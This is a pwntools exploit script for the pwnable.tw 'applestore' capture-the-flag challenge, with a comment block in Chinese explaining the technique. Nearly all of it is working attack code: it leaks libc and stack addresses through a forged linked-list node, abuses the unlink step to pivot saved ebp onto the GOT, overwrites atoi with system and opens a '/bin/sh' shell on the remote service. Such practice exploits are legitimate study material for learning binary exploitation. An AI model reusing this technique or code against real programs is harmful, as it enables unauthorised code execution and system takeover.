# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './applestore'
e = ELF(file)
libc = e.libc
rlibc = './libc_32.so.6'
ip = 'chall.pwnable.tw'
port = '10104'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)


def add(idx):
    sla('> ','2')
    sla("> ", str(idx))

def card(pay = 'y'):
    sla('> ', '4')
    sla("> ", pay)

def remove(idx):
    sla('> ','3')
    sla("> ", str(idx))

def checkout(y='y'):
    sla('> ','5')
    sla("> ", y)

for i in range(6):
    add(1)
for i in range(20):
    add(2)


checkout()
fake_node = p32(e.got['puts']) * 1+p32(0)
card('y\x00'+fake_node)
# remove(27)
ru('27: ')
libc.address = un32(rn(4)) - libc.symbols['puts']
success(hex(libc.address))
fake_node = p32(libc.symbols['environ']) * 1+p32(0)
card('y\x00'+fake_node)
# remove(27)
ru('27: ')
stack = un32(rn(4))
success(stack)
delete_ebp = stack -0x104
fake_node = p32(e.got['puts']) + p32(1) + p32(e.got['atoi']+0x22) + p32(delete_ebp-8)
#dbg('b*0x08048A6F')
remove('27' + fake_node)

sla('>',p32(libc.symbols['system'])+';/bin/sh')
shell()
# card('n\x00' + fake_node)

# remove(27)
'''

插链时，
	end->next=node
	node->prev=node，这时候node的next域是啥？
						从create进入的是0
						在checkout的时候有一个未初始化的node接入，要求Total是7175，链入了一个栈上的地址
						checkout.node:ebp-20h->name
									  ebp-1ch->price
									  esp-18h->next <- hijack
									  esp-14h->prev
						这里可以考虑利用其他函数使得fake_node的地址上留下数据
										card函数中会对ebp-22h输入，刚好可以覆盖checkout的结构
										delete函数会对ebp-22h输入，刚好可以覆盖checkout的结构
										
										



脱链时，
	next=node->next  a=p+8
	prev=node->prev  b=p+12
	prev->next=next  b+8=a=p+8 
	next->prev=prev  a+12=b=p+12
		*(p+8)+12=(p+12) 修改got.atoi，可以要求next和prev都是可写入值，因此无法写入libc函数地址，因为不可写
										因此可以考虑改写栈上saved ebp来栈转移至got


'''
